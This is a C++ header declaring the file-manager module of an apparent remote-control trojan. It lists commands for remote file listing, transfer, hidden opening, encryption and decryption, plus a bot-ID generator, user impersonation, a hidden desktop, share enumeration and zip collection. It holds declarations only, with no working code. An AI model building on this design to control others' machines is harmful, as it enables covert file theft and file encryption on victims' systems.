
#include <winsock2.h>
//#include "FileFinder.h"
#include <list>
#include <string>
#include "Manager.h"
#include <sstream>
#include "zip.h"
using namespace std;

#pragma once
enum
{
	COMMAND_LIST_FILES,
	COMMAND_DELETE_FILE,
	COMMAND_DELETE_DIRECTORY,
	COMMAND_DOWN_FILES,
	COMMAND_CONTINUE,
	COMMAND_CREATE_FOLDER,
	COMMAND_RENAME_FILE,
	COMMAND_STOP,
	COMMAND_SET_TRANSFER_MODE,
	COMMAND_FILE_SIZE,
	COMMAND_FILE_DATA,
	COMMAND_OPEN_FILE_SHOW,
	COMMAND_OPEN_FILE_HIDE,
	COMMAND_COMPRESS_FILE_PARAM,
	COMMAND_FILES_SEARCH_START,
	COMMAND_FILES_SEARCH_STOP,
	COMMAND_FILE_EXCEPTION,
	COMMAND_SEARCH_FILE,
	COMMAND_FILE_GETNETHOOD,
	COMMAND_FILE_RECENT,
	COMMAND_FILE_INFO,
	COMMAND_FILE_Encryption,
	COMMAND_FILE_Decrypt,
	COMMAND_FILE_ENFOCE,
	COMMAND_FILE_CopyFile,
	COMMAND_FILE_PasteFile,
	COMMAND_FILE_zip,
	COMMAND_FILE_zip_stop,
	COMMAND_FILE_NO_ENFORCE,
	COMMAND_FILE_GETINFO,

	COMMAND_FILE_SEARCHPLUS_LIST,


	TOKEN_SEARCH_FILE_LIST,
	TOKEN_SEARCH_FILE_FINISH,
	TOKEN_FILE_LIST,
	TRANSFER_MODE_NORMAL,
	TOKEN_FILE_SIZE,
	TOKEN_FILE_DATA,
	TOKEN_TRANSFER_FINISH,
	TRANSFER_MODE_OVERWRITE_ALL,
	TRANSFER_MODE_ADDITION_ALL,
	TRANSFER_MODE_JUMP_ALL,
	TOKEN_GET_TRANSFER_MODE,
	TRANSFER_MODE_OVERWRITE,
	TRANSFER_MODE_ADDITION,
	TRANSFER_MODE_JUMP,
	TOKEN_CFileManagerDlg_DATA_CONTINUE,
	TOKEN_CREATEFOLDER_FINISH,
	TOKEN_RENAME_FINISH,
	TOKEN_COMPRESS_FINISH,
	TOKEN_DELETE_FINISH,
	TOKEN_SEARCH_ADD,
	TOKEN_SEARCH_END,
	TOKEN_DATA_CONTINUE,
	TOKEN_FILE_GETNETHOOD,
	TOKEN_FILE_RECENT,
	TOKEN_FILE_INFO,
	TOKEN_FILE_REFRESH,
	TOKEN_FILE_ZIPOK,
	TOKEN_FILE_GETINFO,

	TOKEN_FILE_SEARCHPLUS_LIST,
	TOKEN_FILE_SEARCHPLUS_NONTFS,
	TOKEN_FILE_SEARCHPLUS_HANDLE,
	TOKEN_FILE_SEARCHPLUS_INITUSN,
	TOKEN_FILE_SEARCHPLUS_GETUSN,
	TOKEN_FILE_SEARCHPLUS_NUMBER,

	TRANSFER_MODE_CANCEL = 100,
};

typedef struct
{
	UINT	nFileSize;	// 文件大小
	UINT	nSendSize;	// 已发送大小
}SENDFILEPROGRESS, * PSENDFILEPROGRESS;

typedef struct
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	BOOL    error;
}FILESIZE;


typedef struct
{
	TCHAR SearchFileName[MAX_PATH];
	TCHAR SearchPath[MAX_PATH];
	BOOL bEnabledSubfolder;
}FILESEARCH;


typedef struct
{
	BYTE Token;
	int  w,h,size;

}FILEPICINFO;


struct SEARCH
{
	TCHAR TC_disk[8];
	TCHAR TC_search[MAX_PATH];
};

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _FILE_NAME_INFORMATION
{
	ULONG FileNameLength;
	WCHAR FileName[MAX_PATH];
} FILE_NAME_INFORMATION;

//FARPROC ZwQueryInformationFile;
typedef LONG(__stdcall* ZwQueryInformationFile) (
	IN HANDLE FileHandle,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG FileInformationLength,
	IN ULONG FileInformationClass
	);


class CFileManager : public CManager
{
public:
	DWORD dwRet;
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	UINT SendDriveList();
	CFileManager(ISocketBase* pClient);
	virtual ~CFileManager();
private:
	LPBYTE lpSendPacket;
	list <wstring> m_UploadList;
	BOOL m_bIsWow64;
	UINT m_nTransferMode;
	HANDLE m_hFileSend;
	HANDLE m_hFileRecv;
	TCHAR m_strCurrentProcessFileName[MAX_PATH]; // 当前正在处理的文件
	__int64 m_nCurrentProcessFileLength; // 当前正在处理的文件的长度
	bool benofrce;
	//char copyfile[MAX_PATH*2];
	TCHAR* copyfile;
	HANDLE ImpersonateLoggedOnUserWrapper();
	bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
	bool UploadToRemote(LPBYTE lpBuffer);
	bool FixedUploadList(LPCTSTR lpszDirectory);
	void StopTransfer(BOOL bIsUpload);
	UINT SendFilesList(TCHAR* lpszDirectory);
	bool DeleteDirectory(LPCTSTR lpszDirectory);
	UINT SendFileSize(LPCTSTR lpszFileName);
	void SendFileData(LPBYTE lpBuffer);
	void CreateFolder(LPBYTE lpBuffer);
	void Rename(LPBYTE lpBuffer);
	int	 SendToken(BYTE bToken);

	void CreateLocalRecvFile(LPBYTE lpBuffer);
	void SetTransferMode(LPBYTE lpBuffer);
	void GetFileData();
	void WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
	void UploadNext();
	BOOL OpenFile(LPCTSTR lpFile, INT nShowCmd);
	void ExeCompress(BYTE* lpBuffer);
//	void SearchFile(LPBYTE lpBuffer);
	void SendSearchDate(LPBYTE lpBuffer);
	BOOL GetVolumeNameByHandle(HANDLE hFile, char* szFullPath);
	void GetFullPathByFileReferenceNumber(HANDLE hVol, DWORDLONG FileReferenceNumber);
protected:
//	static INT_PTR CALLBACK FileFinderProc(CFileFinder* pFinder, DWORD dwCode, void* pCustomParam);


	HANDLE m_hWorkThread;
	BOOL bIsStopSearch;
	FILESEARCH filesearch;

	void StopSearchTheard();
	void SendSearchFilesList(LPCTSTR str);
	static void WINAPI FindFileThread(LPVOID lparam);
	void FindFileInDir(TCHAR* rootDir, TCHAR* searchfilename, BOOL bEnabledSubfolder);
	 TCHAR       g_desktopName[MAX_PATH];
	 ULONG PseudoRand(ULONG* seed);
	 void GetBotId(TCHAR* botId);
	 HDESK      g_hDesk;;
	 bool getLnkFormPath(TCHAR* lnkPath, TCHAR* szoutPath);
	 void SendNetHood(); //发送共享文件目录
	 void encfile(char* in_filename);
	 void decryptfile(char* in_filename);
	 bool FnDelPathFile(TCHAR* tc_path);


	 TCHAR* zippath_t;
	 HANDLE m_hWorkZIPThread;
	 BOOL bIsStopZIP;
	 void StopZIPTheard();
	 void StartZIP();
	 static void WINAPI FindZIPThread(LPVOID lparam);
	 void FindFileInDirZipAdd(TCHAR* rootDir, HZIP hz,int pathlen);

	 //info
	void SendFileInfo(TCHAR* filepath,TCHAR * type);
	bool ResizePicture(TCHAR* strSource);


	TCHAR* volName; // 驱动盘名称
	TCHAR* tc_search; // 搜索关键词
	HANDLE hVol; // 用于储存驱动盘句柄
	USN_JOURNAL_DATA UsnInfo; // 用于储存USN日志的基本信息
	long counter;
	LPBYTE	 lpBuffer;
	char* c_pathname;
};



